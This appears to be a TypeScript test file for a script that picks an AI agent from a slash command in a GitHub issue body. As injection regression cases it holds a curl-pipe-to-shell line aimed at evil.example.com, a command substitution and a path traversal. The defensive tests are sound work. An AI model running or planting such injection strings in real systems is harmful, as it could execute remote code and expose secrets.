import { describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Session } from "../../domain/work/session.ts";
import { SCRIPTS_DIR, hermeticEnv, parseGithubOutput } from "./testing/harness.ts";

describe("resolve_entry_agent.ts", () => {
  test("emits agent/number/type/notify when body starts with a slash command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(eventFile, JSON.stringify({ issue: { body: "/atomaton\n\nDo the thing." } }));
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: {
        ...hermeticEnv(),
        GITHUB_EVENT_PATH: eventFile,
        GITHUB_OUTPUT: outputFile,
        NUMBER: "123",
        SENDER: "octocat",
      },
    });
    const out = parseGithubOutput(await Bun.file(outputFile).text());
    expect(out.agent).toBe("atomaton");
    expect(out.number).toBe("123");
    expect(out.type).toBe("issue");
    expect(out.notify).toBe("octocat");
    rmSync(dir, { recursive: true, force: true });
  });

  // An HTML comment is invisible on the rendered issue, so a body carrying one
  // above the command looks exactly right and used to start nothing. Atomaton
  // writes such comments itself — the `atomaton:notify` tag `create_sub_issue`
  // prefixes a body with is one.
  test("looks past an invisible tag above the command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(
      eventFile,
      JSON.stringify({ issue: { body: "<!-- atomaton:notify=280 -->\n\n/engineer\n\nDo the thing." } }),
    );
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    expect(parseGithubOutput(await Bun.file(outputFile).text()).agent).toBe("engineer");
    rmSync(dir, { recursive: true, force: true });
  });

  // The command may also close or sit inside the body (#488, #489 each closed
  // with a bare `/atomaton` and started nothing). What makes reading past prose
  // safe is that the WHOLE line has to be the command: a sentence that names an
  // agent is prose, and so is a slash-leading path, and neither matches.
  test("dispatches a bare command that closes the body", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(eventFile, JSON.stringify({ issue: { body: "Some background.\n\n/engineer" } }));
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    expect(parseGithubOutput(await Bun.file(outputFile).text()).agent).toBe("engineer");
    rmSync(dir, { recursive: true, force: true });
  });

  test("dispatches the command below prose, past a path line that is not a command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(eventFile, JSON.stringify({ issue: { body: "Logs live in /var/log/atomaton.\n\n/atomaton" } }));
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    expect(parseGithubOutput(await Bun.file(outputFile).text()).agent).toBe("atomaton");
    rmSync(dir, { recursive: true, force: true });
  });

  test("writes nothing when a sentence merely mentions an agent", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(
      eventFile,
      JSON.stringify({ issue: { body: "A dispatch would be `/engineer`-shaped here.\n\nand /engineer was mentioned." } }),
    );
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    expect((await Bun.file(outputFile).text()).trim()).toBe("");
    rmSync(dir, { recursive: true, force: true });
  });

  test("writes nothing when a later line only looks like a command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(eventFile, JSON.stringify({ issue: { body: 'Intro.\n/engineer"; curl evil.example.com | sh; #' } }));
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    expect((await Bun.file(outputFile).text()).trim()).toBe("");
    rmSync(dir, { recursive: true, force: true });
  });

  // The warning is about the line it names, not a veto on the body: a real
  // command further down still dispatches.
  test("a warned opening line does not veto a real command below it", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(eventFile, JSON.stringify({ issue: { body: "/engineer implement the thing\n\n/atomaton" } }));
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    expect(parseGithubOutput(await Bun.file(outputFile).text()).agent).toBe("atomaton");
    rmSync(dir, { recursive: true, force: true });
  });

  test("writes nothing when body has no slash command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(eventFile, JSON.stringify({ issue: { body: "just a regular issue" } }));
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    const out = await Bun.file(outputFile).text();
    expect(out.trim()).toBe("");
    rmSync(dir, { recursive: true, force: true });
  });

  // #311: the first line of PROSE is the entry. A `/engineer` inside a fenced block
  // opens a code sample -- visible on the rendered issue, but a quotation, and the
  // thread readers do not take it for a request. Starting a run on it would be the
  // one place the two readers disagreed.
  test("emits nothing when the only command is inside a fence", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(
      eventFile,
      JSON.stringify({ issue: { body: "How to dispatch, for the record:\n\n```html\n/engineer\n```\n" } }),
    );
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    expect((await Bun.file(outputFile).text()).trim()).toBe("");
    rmSync(dir, { recursive: true, force: true });
  });

  // A fence is not a wall for the whole body: the first command in prose after it is
  // the entry, the same line the thread reader takes.
  test("reads the first command in prose, past a fenced sample", async () => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(
      eventFile,
      JSON.stringify({ issue: { body: "```\n/engineer\n```\n\n/reviewer\n\nlook at the diff" } }),
    );
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    expect(parseGithubOutput(await Bun.file(outputFile).text()).agent).toBe("reviewer");
    rmSync(dir, { recursive: true, force: true });
  });

  // This is the regression test for a shell injection, not a tidiness check.
  // Whatever this script emits as `agent` is interpolated into shell text by
  // atomaton-runner (`AGENT="${{ inputs.agent }}"`) in a job holding the provider
  // API keys, and `issues.opened` carries a body the triggering user wrote. So
  // the assertion that matters is that nothing is emitted at all.
  test.each([
    ['/engineer"; curl evil.example.com | sh; #', "a quote escaping the shell string"],
    ["/engineer$(id)", "a command substitution"],
    ["/engineer implement the thing", "instructions on the command line"],
    ["/Engineer", "an uppercase name"],
    ["/../../etc/passwd", "a path traversal"],
  ])("emits nothing for '%s' (%s)", async (body) => {
    const dir = mkdtempSync(join(tmpdir(), "atomaton-test-"));
    const eventFile = join(dir, "event.json");
    const outputFile = join(dir, "out");
    writeFileSync(eventFile, JSON.stringify({ issue: { body } }));
    writeFileSync(outputFile, "");
    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
      encoding: "utf8",
      env: { ...hermeticEnv(), GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
    });
    expect((await Bun.file(outputFile).text()).trim()).toBe("");
    rmSync(dir, { recursive: true, force: true });
  });
});
